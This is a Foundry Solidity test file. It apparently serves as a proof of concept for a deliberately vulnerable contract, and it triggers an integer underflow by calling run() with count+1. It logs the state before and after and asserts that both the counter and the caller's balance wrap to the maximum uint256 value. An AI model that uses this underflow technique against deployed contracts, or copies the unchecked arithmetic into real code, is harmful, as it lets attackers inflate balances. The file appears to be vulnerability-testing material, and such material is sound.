// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/integer_overflow_minimal.sol";

contract IntegerOverflowMinimalTest is Test {
    IntegerOverflowMinimal public testContract;
    uint256 private constant MAX_UINT = type(uint256).max;
    
    function setUp() public {
        testContract = new IntegerOverflowMinimal();
    }

    function testIntegerUnderflow() public {
        // Reset state to known values
        testContract.resetCount();
        
        // Capture state BEFORE triggering vulnerability
        uint256 beforeCount = testContract.count();
        uint256 beforeBalance = testContract.getUserBalance(address(this));
        
        console.log("--- BEFORE-Trigger ---");
        console.log("Count state:", beforeCount);
        console.log("User balance:", beforeBalance);
        
        // Prepare and execute vulnerability trigger
        uint256 currentCount = testContract.count();
        uint256 overflowInput = currentCount + 1;
        
        console.log("--- Trigger Run ---");
        console.log("Calling run(%s)", overflowInput);
        testContract.run(overflowInput);
        
        // Capture state AFTER triggering vulnerability
        uint256 afterCount = testContract.count();
        uint256 afterBalance = testContract.getUserBalance(address(this));
        
        console.log("--- AFTER-Trigger ---");
        console.log("Count state:", afterCount);
        console.log("User balance:", afterBalance);
        
        // Vulnerability verification
        bool countUnderflowed = (afterCount == MAX_UINT);
        bool balanceUnderflowed = (afterBalance == MAX_UINT);
        bool vulnerabilityTriggered = countUnderflowed && balanceUnderflowed;
        
        console.log("Underflow in count:", countUnderflowed ? "YES" : "NO");
        console.log("Underflow in balance:", balanceUnderflowed ? "YES" : "NO");
        
        // Final vulnerability verdict
        if (vulnerabilityTriggered) {
            console.log("Vulnerability Exists: Successful underflow reset state to MAX_UINT");
        } else {
            console.log("Vulnerability not Exist: Underflow did not occur as expected");
        }
        
        // Original assertions maintained
        assertEq(afterCount, MAX_UINT, "Count not underflowed correctly");
        assertEq(
            afterBalance, 
            MAX_UINT,
            "User balance not updated to underflowed value"
        );
    }
}